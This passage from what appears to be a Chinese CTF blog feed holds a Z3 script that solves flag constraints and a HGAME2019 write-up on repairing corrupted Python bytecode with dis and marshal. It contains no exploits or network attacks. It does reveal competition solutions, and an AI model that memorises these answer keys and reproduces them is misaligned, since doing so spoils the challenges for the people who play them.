* v34[16]</span><br><span class="line">      + 85 * v34[26]</span><br><span class="line">      + 43 * v34[20]</span><br><span class="line">      + 67 * v34[15]</span><br><span class="line">      + 97 * v34[8]</span><br><span class="line">      + 80 * v34[0]</span><br><span class="line">      + 23 * v34[3]</span><br><span class="line">      + 95 * v34[25]</span><br><span class="line">      + 82 * v34[21]</span><br><span class="line">      + 66 * v34[31]</span><br><span class="line">      + 5 * v34[4]</span><br><span class="line">      + 66 * v34[27]</span><br><span class="line">      + 25 * v34[12]</span><br><span class="line">      + 4 * v34[5]</span><br><span class="line">      + 12 * v34[7]</span><br><span class="line">      + 85 * v34[1]</span><br><span class="line">      + 10 * v34[6]</span><br><span class="line">      + 45 * v34[11]</span><br><span class="line">      + 28 * v34[18]</span><br><span class="line">      + 26 * v34[19] + 48 * v34[23] + 45 * v34[17] == 148888)</span><br><span class="line">solver.add(25 * v34[8] + 81 * v34[30]</span><br><span class="line">      + 21 * v34[6]</span><br><span class="line">      + 72 * v34[11]</span><br><span class="line">      + 48 * v34[18]</span><br><span class="line">      + 2 * v34[19]</span><br><span class="line">      + 42 * v34[10]</span><br><span class="line">      + 22 * v34[24]</span><br><span class="line">      + 99 * v34[2]</span><br><span class="line">      + 78 * v34[22]</span><br><span class="line">      + 83 * v34[12]</span><br><span class="line">      + 60 * v34[9]</span><br><span class="line">      + 59 * v34[13]</span><br><span class="line">      + 15 * v34[5]</span><br><span class="line">      + 25 * v34[20]</span><br><span class="line">      + 43 * v34[15]</span><br><span class="line">      + 56 * v34[28]</span><br><span class="line">      + 33 * v34[25]</span><br><span class="line">      + 71 * v34[23]</span><br><span class="line">      + 31 * v34[0]</span><br><span class="line">      + 95 * v34[3]</span><br><span class="line">      + 73 * v34[17]</span><br><span class="line">      + 86 * v34[14]</span><br><span class="line">      + 15 * v34[21]</span><br><span class="line">      + 61 * v34[7]</span><br><span class="line">      + 12 * v34[29]</span><br><span class="line">      + 95 * v34[26] + 13 * v34[1] + 100 * v34[16] + 11 * v34[4] + 79 * v34[27] == 138023)</span><br><span class="line">solver.add(37 * v34[28] + 62 * v34[25] + 42 * v34[18] + 53 * v34[27]</span><br><span class="line">      + 52 * v34[29]</span><br><span class="line">      + 70 * v34[22]</span><br><span class="line">      + 35 * v34[30]</span><br><span class="line">      + 50 * v34[16]</span><br><span class="line">      + 59 * v34[8]</span><br><span class="line">      + 75 * v34[10]</span><br><span class="line">      + 55 * v34[20]</span><br><span class="line">      + 23 * v34[0]</span><br><span class="line">      + 52 * v34[17]</span><br><span class="line">      + 47 * v34[3]</span><br><span class="line">      + 91 * v34[13]</span><br><span class="line">      + 46 * v34[7]</span><br><span class="line">      + 42 * v34[14]</span><br><span class="line">      + 79 * v34[26]</span><br><span class="line">      + 87 * v34[21]</span><br><span class="line">      + 30 * v34[6]</span><br><span class="line">      + 26 * v34[1]</span><br><span class="line">      + 57 * v34[31]</span><br><span class="line">      + 33 * v34[12]</span><br><span class="line">      + 51 * v34[9]</span><br><span class="line">      + 56 * v34[24]</span><br><span class="line">      + 59 * v34[11]</span><br><span class="line">      + 36 * v34[23]</span><br><span class="line">      + 88 * v34[4]</span><br><span class="line">      + 28 * v34[2] + 44 * v34[15] + 19 * v34[19] + 74 * v34[5] == 142299)</span><br><span class="line">solver.add( 80 * v34[21]</span><br><span class="line">      + 43 * v34[31]</span><br><span class="line">      + 67 * v34[16]</span><br><span class="line">      + 55 * v34[13]</span><br><span class="line">      + 95 * v34[24]</span><br><span class="line">      + 46 * v34[28]</span><br><span class="line">      + 93 * v34[5]</span><br><span class="line">      + 75 * v34[20]</span><br><span class="line">      + 14 * v34[25]</span><br><span class="line">      + 24 * v34[26]</span><br><span class="line">      + 50 * v34[29]</span><br><span class="line">      + 70 * v34[15]</span><br><span class="line">      + 63 * v34[30]</span><br><span class="line">      + 77 * v34[23]</span><br><span class="line">      + 96 * v34[19]</span><br><span class="line">      + 66 * v34[11]</span><br><span class="line">      + 72 * v34[27]</span><br><span class="line">      + 94 * v34[4]</span><br><span class="line">      + 63 * v34[22]</span><br><span class="line">      + 69 * v34[3]</span><br><span class="line">      + 73 * v34[1]</span><br><span class="line">      + 60 * v34[7]</span><br><span class="line">      + 9 * v34[2]</span><br><span class="line">      + 39 * v34[17]</span><br><span class="line">      + 25 * v34[0]</span><br><span class="line">      + 49 * v34[14] + 48 * v34[8] + 86 * v34[9] + 72 * v34[10] + 23 * v34[18] + 21 * v34[6] == 155777)</span><br><span class="line">solver.add(25 * v34[24] + 11 * v34[22] + 27 * v34[11]</span><br><span class="line">      + 40 * v34[8]</span><br><span class="line">      + 53 * v34[15]</span><br><span class="line">      + 40 * v34[18]</span><br><span class="line">      + 56 * v34[3]</span><br><span class="line">      + 2 * v34[2]</span><br><span class="line">      + 32 * v34[4]</span><br><span class="line">      + 90 * v34[1]</span><br><span class="line">      + 54 * v34[16]</span><br><span class="line">      + 20 * v34[9]</span><br><span class="line">      + 86 * v34[17]</span><br><span class="line">      + 82 * v34[31]</span><br><span class="line">      + 43 * v34[25]</span><br><span class="line">      + 43 * v34[13]</span><br><span class="line">      + 86 * v34[21]</span><br><span class="line">      + 17 * v34[0]</span><br><span class="line">      + (v34[14] * 64)</span><br><span class="line">      + 6 * v34[30]</span><br><span class="line">      + 86 * v34[5]</span><br><span class="line">      + 15 * v34[7]</span><br><span class="line">      + 46 * v34[12]</span><br><span class="line">      + 21 * v34[26]</span><br><span class="line">      + 90 * v34[20]</span><br><span class="line">      + 19 * v34[6]</span><br><span class="line">      + 93 * v34[23]</span><br><span class="line">      + 31 * v34[27] + 62 * v34[29] + 21 * v34[19] + 42 * v34[10] == 117687)</span><br><span class="line">solver.add(89 * v34[21] + 100 * v34[13] + v34[27]</span><br><span class="line">      + 66 * v34[18]</span><br><span class="line">      + 40 * v34[17]</span><br><span class="line">      + 17 * v34[0]</span><br><span class="line">      + 27 * v34[19]</span><br><span class="line">      + 26 * v34[31]</span><br><span class="line">      + 57 * v34[24]</span><br><span class="line">      + 35 * v34[3]</span><br><span class="line">      + 80 * v34[1]</span><br><span class="line">      + 67 * v34[5]</span><br><span class="line">      + 85 * v34[6]</span><br><span class="line">      + 7 * v34[15]</span><br><span class="line">      + 93 * v34[8]</span><br><span class="line">      + 3 * v34[22]</span><br><span class="line">      + 77 * v34[12]</span><br><span class="line">      + 12 * v34[28]</span><br><span class="line">      + 4 * v34[2]</span><br><span class="line">      + 27 * v34[9]</span><br><span class="line">      + 53 * v34[25]</span><br><span class="line">      + 37 * v34[30]</span><br><span class="line">      + 43 * v34[23]</span><br><span class="line">      + 33 * v34[4]</span><br><span class="line">      + 39 * v34[26]</span><br><span class="line">      + 7 * v34[7]</span><br><span class="line">      + 75 * v34[10]</span><br><span class="line">      + 15 * v34[14] + 45 * v34[20] + 36 * v34[29] + 78 * v34[11] + 31 * v34[16] == 117383)</span><br><span class="line">solver.add(73 * v34[20] + 16 * v34[26] + 100 * v34[5] + 71 * v34[28] + 71 * v34[16]</span><br><span class="line">      + 4 * v34[1]</span><br><span class="line">      + 77 * v34[31]</span><br><span class="line">      + 83 * v34[2]</span><br><span class="line">      + 11 * v34[30]</span><br><span class="line">      + 53 * v34[19]</span><br><span class="line">      + 85 * v34[12]</span><br><span class="line">      + 67 * v34[13]</span><br><span class="line">      + 39 * v34[8]</span><br><span class="line">      + 45 * v34[24]</span><br><span class="line">      + 84 * v34[22]</span><br><span class="line">      + 99 * v34[14]</span><br><span class="line">      + 38 * v34[3]</span><br><span class="line">      + 29 * v34[4]</span><br><span class="line">      + 90 * v34[9]</span><br><span class="line">      + 61 * v34[18]</span><br><span class="line">      + 40 * v34[7]</span><br><span class="line">      + (v34[17] * 64)</span><br><span class="line">      + 9 * v34[25]</span><br><span class="line">      + 86 * v34[29]</span><br><span class="line">      + 80 * v34[21]</span><br><span class="line">      + 4 * v34[15]</span><br><span class="line">      + 96 * v34[23]</span><br><span class="line">      + 99 * v34[10]</span><br><span class="line">      + 40 * v34[27] + 4 * v34[0] + 56 * v34[11] == 155741)</span><br><span class="line">solver.add((v34[12] * 64) + 76 * v34[0] + 5 * v34[11] + 87 * v34[2]</span><br><span class="line">            + 86 * v34[24]</span><br><span class="line">            + 76 * v34[14]</span><br><span class="line">            + 38 * v34[23]</span><br><span class="line">            + 85 * v34[3]</span><br><span class="line">            + 71 * v34[22]</span><br><span class="line">            + 42 * v34[29]</span><br><span class="line">            + 85 * v34[30]</span><br><span class="line">            + 14 * v34[10]</span><br><span class="line">            + 17 * v34[13]</span><br><span class="line">            + 42 * v34[25]</span><br><span class="line">            + 11 * v34[19]</span><br><span class="line">            + 44 * v34[15]</span><br><span class="line">            + 21 * v34[4]</span><br><span class="line">            + 60 * v34[16]</span><br><span class="line">            + 28 * v34[6]</span><br><span class="line">            + 46 * v34[20]</span><br><span class="line">            + 25 * v34[9]</span><br><span class="line">            + 77 * v34[31]</span><br><span class="line">            + 21 * v34[8]</span><br><span class="line">            + 85 * v34[7]</span><br><span class="line">            + 36 * v34[1]</span><br><span class="line">            + 91 * v34[27]</span><br><span class="line">            + 21 * v34[28]</span><br><span class="line">            + 38 * v34[17] + 3 * v34[26] + 61 * v34[21] + 15 * v34[5] + 32 * v34[18] == 132804)</span><br><span class="line">solver.add(95 * v34[30] + 75 * v34[28] + 3 * v34[10] + 36 * v34[1]</span><br><span class="line">            + 60 * v34[3]</span><br><span class="line">            + 84 * v34[11]</span><br><span class="line">            + 19 * v34[26]</span><br><span class="line">            + 76 * v34[27]</span><br><span class="line">            + 86 * v34[16]</span><br><span class="line">            + 92 * v34[8]</span><br><span class="line">            + 96 * v34[14]</span><br><span class="line">            + 60 * v34[21]</span><br><span class="line">            + 23 * v34[4]</span><br><span class="line">            + 60 * v34[12]</span><br><span class="line">            + 50 * v34[23]</span><br><span class="line">            + 78 * v34[22]</span><br><span class="line">            + 45 * v34[9]</span><br><span class="line">            + 42 * v34[18]</span><br><span class="line">            + 10 * v34[2]</span><br><span class="line">            + 60 * v34[20]</span><br><span class="line">            + 24 * v34[24]</span><br><span class="line">            + 77 * v34[7]</span><br><span class="line">            + 41 * v34[6]</span><br><span class="line">            + 29 * v34[13]</span><br><span class="line">            + 33 * v34[5]</span><br><span class="line">            + 2 * v34[15]</span><br><span class="line">            + 33 * v34[29]</span><br><span class="line">            + 39 * v34[31] + 41 * v34[25] + 100 * v34[19] + 9 * v34[17] + 79 * v34[0] == 145568)</span><br><span class="line">solver.add(68 * v34[5] + 98 * v34[27] + 98 * v34[16] + 10 * v34[19] + 25 * v34[26]</span><br><span class="line">            + 98 * v34[24]</span><br><span class="line">            + 15 * v34[6]</span><br><span class="line">            + 50 * v34[18]</span><br><span class="line">            + 88 * v34[20]</span><br><span class="line">            + 74 * v34[11]</span><br><span class="line">            + 83 * v34[1]</span><br><span class="line">            + 86 * v34[21]</span><br><span class="line">            + 52 * v34[7]</span><br><span class="line">            + 39 * v34[10]</span><br><span class="line">            + 40 * v34[13]</span><br><span class="line">            + 82 * v34[28]</span><br><span class="line">            + 37 * v34[3]</span><br><span class="line">            + 45 * v34[0]</span><br><span class="line">            + 18 * v34[25]</span><br><span class="line">            + 2 * v34[29]</span><br><span class="line">            + 6 * v34[12]</span><br><span class="line">            + 78 * v34[31]</span><br><span class="line">            + 37 * v34[2]</span><br><span class="line">            + 57 * v34[23]</span><br><span class="line">            + 3 * v34[4]</span><br><span class="line">            + 59 * v34[8]</span><br><span class="line">            + 73 * v34[15]</span><br><span class="line">            + v34[22]</span><br><span class="line">            + 18 * v34[9]</span><br><span class="line">            + 35 * v34[14] + 20 * v34[17] + 54 * v34[30] == 130175)</span><br><span class="line">solver.add(60 * v34[10] + 50 * v34[12] + 30 * v34[29] + 90 * v34[19] + 68 * v34[23]</span><br><span class="line">            + 60 * v34[18]</span><br><span class="line">            + 93 * v34[20]</span><br><span class="line">            + 100 * v34[11]</span><br><span class="line">            + 98 * v34[14]</span><br><span class="line">            + 32 * v34[3]</span><br><span class="line">            + 15 * v34[21]</span><br><span class="line">            + 79 * v34[0]</span><br><span class="line">            + 6 * v34[24]</span><br><span class="line">            + 62 * v34[26]</span><br><span class="line">            + 96 * v34[6]</span><br><span class="line">            + 68 * v34[22]</span><br><span class="line">            + 9 * v34[7]</span><br><span class="line">            + 88 * v34[5]</span><br><span class="line">            + 18 * v34[27]</span><br><span class="line">            + 70 * v34[9]</span><br><span class="line">            + 96 * v34[25]</span><br><span class="line">            + 89 * v34[4]</span><br><span class="line">            + 14 * v34[31]</span><br><span class="line">            + 83 * v34[17]</span><br><span class="line">            + 19 * v34[15]</span><br><span class="line">            + 44 * v34[1]</span><br><span class="line">            + 96 * v34[8]</span><br><span class="line">            + 87 * v34[16]</span><br><span class="line">            + 48 * v34[2]</span><br><span class="line">            + 95 * v34[13] + 73 * v34[28] + 92 * v34[30] == 171986)</span><br><span class="line">solver.add(53 * v34[30] + 87 * v34[25] + 23 * v34[29] + 80 * v34[20] + 86 * v34[9]</span><br><span class="line">            + 20 * v34[7]</span><br><span class="line">            + 29 * v34[16]</span><br><span class="line">            + 31 * v34[14]</span><br><span class="line">            + 83 * v34[26]</span><br><span class="line">            + 11 * v34[4]</span><br><span class="line">            + 29 * v34[19]</span><br><span class="line">            + 82 * v34[13]</span><br><span class="line">            + 84 * v34[10]</span><br><span class="line">            + 70 * v34[1]</span><br><span class="line">            + 52 * v34[12]</span><br><span class="line">            + 40 * v34[6]</span><br><span class="line">            + 91 * v34[8]</span><br><span class="line">            + 6 * v34[17]</span><br><span class="line">            + 77 * v34[28]</span><br><span class="line">            + 56 * v34[5]</span><br><span class="line">            + 86 * v34[23]</span><br><span class="line">            + 63 * v34[31]</span><br><span class="line">            + 26 * v34[27]</span><br><span class="line">            + 19 * v34[22]</span><br><span class="line">            + 50 * v34[3]</span><br><span class="line">            + 15 * v34[15]</span><br><span class="line">            + 67 * v34[2]</span><br><span class="line">            + 37 * v34[24]</span><br><span class="line">            + 84 * v34[18] + 81 * v34[21] + 93 * v34[0] == 151676)</span><br><span class="line">solver.add(29 * v34[3] + 93 * v34[5] + 67 * v34[21] + 12 * v34[11]</span><br><span class="line">            + 82 * v34[24]</span><br><span class="line">            + 100 * v34[8]</span><br><span class="line">            + 29 * v34[26]</span><br><span class="line">            + 97 * v34[12]</span><br><span class="line">            + 32 * v34[6]</span><br><span class="line">            + 26 * v34[27]</span><br><span class="line">            + 46 * v34[19]</span><br><span class="line">            + 8 * (v34[25] + 9 * v34[0] + 2 * v34[17])</span><br><span class="line">            + 63 * v34[10]</span><br><span class="line">            + 39 * v34[29]</span><br><span class="line">            + 81 * v34[15]</span><br><span class="line">            + 51 * v34[13]</span><br><span class="line">            + 31 * v34[30]</span><br><span class="line">            + 49 * v34[4]</span><br><span class="line">            + 3 * v34[22]</span><br><span class="line">            + 26 * v34[28]</span><br><span class="line">            + 15 * v34[20]</span><br><span class="line">            + 89 * v34[2]</span><br><span class="line">            + 5 * v34[31]</span><br><span class="line">            + 47 * v34[18]</span><br><span class="line">            + 19 * v34[23]</span><br><span class="line">            + 98 * v34[9] + 15 * v34[16] + 49 * v34[1] == 128223)</span><br><span class="line">solver.add(13 * v34[14] + 73 * v34[19] + 99 * v34[7] + 76 * v34[12] + 84 * v34[25]</span><br><span class="line">            + 91 * v34[10]</span><br><span class="line">            + 67 * v34[22]</span><br><span class="line">            + 77 * v34[15]</span><br><span class="line">            + 23 * v34[26]</span><br><span class="line">            + 38 * v34[4]</span><br><span class="line">            + 3 * v34[31]</span><br><span class="line">            + 76 * v34[13]</span><br><span class="line">            + 50 * v34[0]</span><br><span class="line">            + 74 * v34[11]</span><br><span class="line">            + 45 * v34[28]</span><br><span class="line">            + 58 * v34[29]</span><br><span class="line">            + 39 * v34[5]</span><br><span class="line">            + 95 * v34[9]</span><br><span class="line">            + 26 * v34[16]</span><br><span class="line">            + 23 * v34[8]</span><br><span class="line">            + 28 * v34[24]</span><br><span class="line">            + 89 * v34[1]</span><br><span class="line">            + 88 * v34[18]</span><br><span class="line">            + 3 * v34[3]</span><br><span class="line">           + 59 * v34[20]</span><br><span class="line">            + 80 * v34[23]</span><br><span class="line">            + 49 * v34[17]</span><br><span class="line">            + 56 * v34[21]</span><br><span class="line">            + 32 * v34[27]</span><br><span class="line">            + 24 * v34[2] + 77 * v34[30] + 18 * v34[6] == 138403)</span><br><span class="line">if solver.check() == sat:</span><br><span class="line">m = solver.model()</span><br><span class="line">s=[]</span><br><span class="line">for i in range(32):</span><br><span class="line">s.append(m[v34[i]].as_long())</span><br><span class="line">print &apos;&apos;.join([chr(i) for i in s])</span><br></pre></td></tr></table></figure><p><del>没带鼠标回家拖数据好累</del>s</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2019-python-bytecode</title>
      <link href="/2019/02/06/HGAME2019-python-bytecode/"/>
      <url>/2019/02/06/HGAME2019-python-bytecode/</url>
      
        <content type="html"><![CDATA[<p>题目给了一个pyc文件，但是不能用uncompyle2反编译成py文件。很难受，给了hint：bytecode。网上🏄发现了python自带的dis模块，可以解析一下pyc文件。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import dis</span><br><span class="line">import marshal</span><br><span class="line">f=open(&quot;1.pyc&quot;,&apos;rb&apos;)</span><br><span class="line">magic=f.read(4)</span><br><span class="line">mtime=f.read(4)</span><br><span class="line">code=marshal.load(f)</span><br><span class="line">dis.dis(code)</span><br></pre></td></tr></table></figure><p>然而什么都不做直接使用dis会出现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  2           0 JUMP_ABSOLUTE            3</span><br><span class="line">        &gt;&gt;    3 JUMP_ABSOLUTE            9</span><br><span class="line">              6 LOAD_CONST              15 (&quot;You&apos;re Wrong! &quot;)</span><br><span class="line">        &gt;&gt;    9 JUMP_ABSOLUTE           14</span><br><span class="line"></span><br><span class="line">  3          12 PRINT_ITEM          </span><br><span class="line">             13 LOAD_CONST             100</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;2.py&quot;, line 6, in &lt;module&gt;</span><br><span class="line">    dis.dis(code)</span><br><span class="line">  File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/dis.py&quot;, line 43, in dis</span><br><span class="line">    disassemble(x)</span><br><span class="line">  File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/dis.py&quot;, line 95, in disassemble</span><br><span class="line">    print &apos;(&apos; + repr(co.co_consts[oparg]) + &apos;)&apos;,</span><br><span class="line">IndexError: tuple index out of range</span><br></pre></td></tr></table></figure><p>继续网上🏄，了解到结合上下文修改出错的地方的字节码就OK了。没有头绪地弄了半天，最终改掉了<code>LOAD_CONST             100</code>中的100，十六进制表示为0x64，改成00就可以先凑合看着了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"> 2           0 JUMP_ABSOLUTE            3</span><br><span class="line">       &gt;&gt;    3 JUMP_ABSOLUTE            9</span><br><span class="line">             6 LOAD_CONST              15 (&quot;You&apos;re Wrong! &quot;)</span><br><span class="line">       &gt;&gt;    9 JUMP_ABSOLUTE           14</span><br><span class="line"></span><br><span class="line"> 3          12 PRINT_ITEM          </span><br><span class="line">            13 PRINT_NEWLINE       </span><br><span class="line">       &gt;&gt;   14 LOAD_CONST               0 (-1)</span><br><span class="line">            17 LOAD_CONST               1 (None)</span><br><span class="line">            20 IMPORT_NAME              0 (string)</span><br><span class="line">            23 STORE_NAME               0 (string)</span><br><span class="line">            26 LOAD_NAME                1 (list)</span><br><span class="line">            29 LOAD_NAME                0 (string)</span><br><span class="line">            32 LOAD_ATTR                2 (letters)</span><br><span class="line">            35 CALL_FUNCTION            1</span><br><span class="line">            38 LOAD_NAME                1 (list)</span><br><span class="line">            41 LOAD_NAME                0 (string)</span><br><span class="line">            44 LOAD_ATTR                3 (digits)</span><br><span class="line">            47 CALL_FUNCTION            1</span><br><span class="line"></span><br><span class="line"> 5          50 BINARY_ADD          </span><br><span class="line">            51 LOAD_CONST               2 (&apos;+&apos;)</span><br><span class="line">            54 LOAD_CONST               3 (&apos;/&apos;)</span><br><span class="line">            57 BUILD_LIST               2</span><br><span class="line">            60 BINARY_ADD          </span><br><span class="line">            61 STORE_NAME               2 (letters)</span><br><span class="line">            64 LOAD_CONST               4 (&apos;FcjTCgD1EffEm2rPC3bTyL5Wu2bKBI9KAZrwFgrUygHN&apos;)</span><br><span class="line">            67 STORE_NAME               4 (dec)</span><br><span class="line"></span><br><span class="line">35          70 LOAD_CONST               5 (&lt;code object encode at 0x101a328b0, file &quot;third.py&quot;, line 7&gt;)</span><br><span class="line">            73 MAKE_FUNCTION            0</span><br><span class="line">            76 STORE_NAME               5 (encode)</span><br><span class="line">            79 LOAD_CONST               6 (&quot;Welcome to Processor&apos;s Python Classroom Part 3&amp;4!\n&quot;)</span><br><span class="line">            82 PRINT_ITEM          </span><br><span class="line">            83 PRINT_NEWLINE       </span><br><span class="line">            84 LOAD_CONST               7 (&apos;qi shi wo jiu shi lan cai ba liang dao ti fang zai yi qi.&apos;)</span><br><span class="line">            87 PRINT_ITEM          </span><br><span class="line">            88 PRINT_NEWLINE       </span><br><span class="line">            89 LOAD_CONST               8 (&quot;Now let&apos;s start the origin of Python!\n&quot;)</span><br><span class="line">            92 PRINT_ITEM          </span><br><span class="line">            93 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line">40          94 LOAD_CONST               9 (&apos;Plz Input Your Flag:\n&apos;)</span><br><span class="line">            97 PRINT_ITEM          </span><br><span class="line">            98 PRINT_NEWLINE       </span><br><span class="line">            99 LOAD_NAME                6 (raw_input)</span><br><span class="line">           102 CALL_FUNCTION            0</span><br><span class="line">           105 STORE_NAME               7 (enc)</span><br><span class="line">           108 LOAD_NAME                1 (list)</span><br><span class="line">           111 LOAD_NAME                7 (enc)</span><br><span class="line">           114 CALL_FUNCTION            1</span><br><span class="line">           117 STORE_NAME               8 (lst)</span><br><span class="line">           120 LOAD_NAME                8 (lst)</span><br><span class="line">           123 LOAD_ATTR                9 (reverse)</span><br><span class="line">           126 CALL_FUNCTION            0</span><br><span class="line">           129 POP_TOP             </span><br><span class="line">           130 LOAD_NAME               10 (len)</span><br><span class="line">           133 LOAD_NAME                8 (lst)</span><br><span class="line">           136 CALL_FUNCTION            1</span><br><span class="line">           139 STORE_NAME              11 (llen)</span><br><span class="line">           142 SETUP_LOOP              99 (to 244)</span><br><span class="line">           145 LOAD_NAME               12 (range)</span><br><span class="line">           148 LOAD_NAME               11 (llen)</span><br><span class="line">           151 CALL_FUNCTION            1</span><br><span class="line">           154 GET_ITER            </span><br><span class="line">           155 FOR_ITER                85 (to 243)</span><br><span class="line">           158 STORE_NAME              13 (i)</span><br><span class="line">           161 LOAD_NAME               13 (i)</span><br><span class="line">           164 LOAD_CONST              10 (2)</span><br><span class="line">           167 BINARY_MODULO       </span><br><span class="line">           168 LOAD_CONST              11 (0)</span><br><span class="line">           171 COMPARE_OP               2 (==)</span><br><span class="line">           174 POP_JUMP_IF_FALSE      196</span><br><span class="line">           177 LOAD_NAME               14 (chr)</span><br><span class="line">           180 LOAD_NAME               15 (ord)</span><br><span class="line">           183 LOAD_NAME                8 (lst)</span><br><span class="line">           186 LOAD_NAME               13 (i)</span><br><span class="line">           189 BINARY_SUBSCR       </span><br><span class="line">           190 CALL_FUNCTION            1</span><br><span class="line">           193 LOAD_CONST              10 (2)</span><br><span class="line"></span><br><span class="line">46     &gt;&gt;  196 BINARY_SUBTRACT     </span><br><span class="line">           197 CALL_FUNCTION            1</span><br><span class="line">           200 LOAD_NAME                8 (lst)</span><br><span class="line">           203 LOAD_NAME               13 (i)</span><br><span class="line">           206 STORE_SUBSCR        </span><br><span class="line">           207 JUMP_FORWARD             0 (to 210)</span><br><span class="line">       &gt;&gt;  210 LOAD_NAME               14 (chr)</span><br><span class="line">           213 LOAD_NAME               15 (ord)</span><br><span class="line">           216 LOAD_NAME                8 (lst)</span><br><span class="line">           219 LOAD_NAME               13 (i)</span><br><span class="line">           222 BINARY_SUBSCR       </span><br><span class="line">           223 CALL_FUNCTION            1</span><br><span class="line">           226 LOAD_CONST              12 (1)</span><br><span class="line">           229 BINARY_ADD          </span><br><span class="line"></span><br><span class="line">48         230 CALL_FUNCTION            1</span><br><span class="line">           233 LOAD_NAME                8 (lst)</span><br><span class="line"></span><br><span class="line">49         236 LOAD_NAME               13 (i)</span><br><span class="line">           239 STORE_SUBSCR        </span><br><span class="line">           240 JUMP_ABSOLUTE          141</span><br><span class="line">       &gt;&gt;  243 POP_BLOCK           </span><br><span class="line">       &gt;&gt;  244 LOAD_CONST              13 (&apos;&apos;)</span><br><span class="line">           247 STORE_NAME              16 (enc2)</span><br><span class="line">           250 LOAD_NAME               16 (enc2)</span><br><span class="line">           253 LOAD_ATTR               17 (join)</span><br><span class="line">           256 LOAD_NAME                8 (lst)</span><br><span class="line">           259 CALL_FUNCTION            1</span><br><span class="line">           262 STORE_NAME              16 (enc2)</span><br><span class="line">           265 LOAD_NAME                5 (encode)</span><br><span class="line">           268 LOAD_NAME               16 (enc2)</span><br><span class="line">           271 CALL_FUNCTION            1</span><br><span class="line">           274 STORE_NAME              18 (enc3)</span><br><span class="line">           277 LOAD_NAME               18 (enc3)</span><br><span class="line">           280 LOAD_NAME                4 (dec)</span><br><span class="line"></span><br><span class="line">55     &gt;&gt;  283 COMPARE_OP               2 (==)</span><br><span class="line">           286 POP_JUMP_IF_FALSE      283</span><br><span class="line">           289 LOAD_CONST              14 (&quot;You&apos;re right! &quot;)</span><br><span class="line">           292 PRINT_ITEM          </span><br><span class="line">           293 PRINT_NEWLINE       </span><br><span class="line">           294 JUMP_FORWARD             5 (to 302)</span><br><span class="line">           297 LOAD_CONST              15 (&quot;You&apos;re Wrong! &quot;)</span><br><span class="line">           300 PRINT_ITEM          </span><br><span class="line">           301 PRINT_NEWLINE       </span><br><span class="line">       &gt;&gt;  302 LOAD_CONST               1 (None)</span><br><span class="line">           305 RETURN_VALUE</span><br></pre></td></tr></table></figure><p>还是比较好看的，只是一开始把<code>MAKE_FUNCTION            0</code>当成了定义一个无参函数，造成了很多不必要的麻烦。后来通过自己写py然后编译pyc然后用dis看的方法，大致是还原出了py源码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 